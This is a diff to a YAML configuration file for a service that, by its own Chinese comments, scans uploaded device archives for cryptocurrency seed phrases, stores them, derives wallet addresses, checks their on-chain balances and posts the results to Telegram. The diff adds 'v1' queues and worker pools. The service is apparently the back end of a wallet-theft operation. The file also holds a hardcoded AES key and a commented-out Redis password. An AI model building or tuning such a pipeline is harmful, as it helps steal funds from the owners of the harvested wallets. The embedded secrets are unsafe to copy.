@@ -23,6 +23,7 @@ spring:
   redis:
     host: 127.0.0.1
     port: 6379
+    #password: 123456
     database: 2
     timeout: 15s
     lettuce:
@@ -59,11 +60,18 @@ v26:
   upload-dir: D:/v26_records/uploads
   mnemonic-aes-key: "Mn3m0n1c@2024!SecureKey@98kapp"
   queue:
-    # 扫压缩包、提取助记词入库（不查链）
+    # 扫压缩包、提取助记词入库队列
     device-parse: queue:device_parse
-    # 派生地址 + 查链余额 + 余额飞机（跟上面不是同一条队列）
+    device-parse-v1: queue:device_parse_v1
+    # 派生地址 + 查链余额 + 余额飞机队列
     mnemonic-balance: queue:mnemonic_balance
+    mnemonic-balance-v1: queue:mnemonic_balance_v1
+    #备忘录队列
     notes-mnemonic: queue:notes_mnemonic
+    notes-mnemonic-v1: queue:notes_mnemonic_v1
+    # 包内缓存地址/余额队列
+    package-address: queue:package_address
+    package-address-v1: queue:package_address_v1
     tg-message: queue:tg_message
   consumer:
     # true=解析和查链拆开；false=解析线程里同步查链（会变慢）
@@ -78,7 +86,17 @@ v26:
       pollers: 2
       queue-capacity: 64
       pop-batch: 8
+    parse-v1:
+      threads: 4
+      pollers: 2
+      queue-capacity: 64
+      pop-batch: 8
     notes:
+      threads: 8
+      pollers: 2
+      queue-capacity: 64
+      pop-batch: 8
+    notes-v1:
       threads: 4
       pollers: 2
       queue-capacity: 32
@@ -88,6 +106,21 @@ v26:
       pollers: 2
       queue-capacity: 64
       pop-batch: 8
+    balance-v1:
+      threads: 8
+      pollers: 2
+      queue-capacity: 32
+      pop-batch: 4
+    package-address:
+      threads: 8
+      pollers: 2
+      queue-capacity: 32
+      pop-batch: 4
+    package-address-v1:
+      threads: 2
+      pollers: 1
+      queue-capacity: 32
+      pop-batch: 4
     telegram:
       threads: 4
       pollers: 2
@@ -95,12 +128,22 @@ v26:
       pop-batch: 8
     # 单设备内并行解压扫包
     scan-pool:
+      core-size: 8
+      max-size: 16
+      queue-capacity: 64
+      keep-alive-seconds: 60
+    scan-pool-v1:
       core-size: 4
-      max-size: 8
+      max-size: 4
       queue-capacity: 64
       keep-alive-seconds: 60
     # 打链上 RPC 查余额
     balance-http-pool:
+      core-size: 12
+      max-size: 24
+      queue-capacity: 256
+      keep-alive-seconds: 60
+    balance-http-pool-v1:
       core-size: 12
       max-size: 24
       queue-capacity: 256
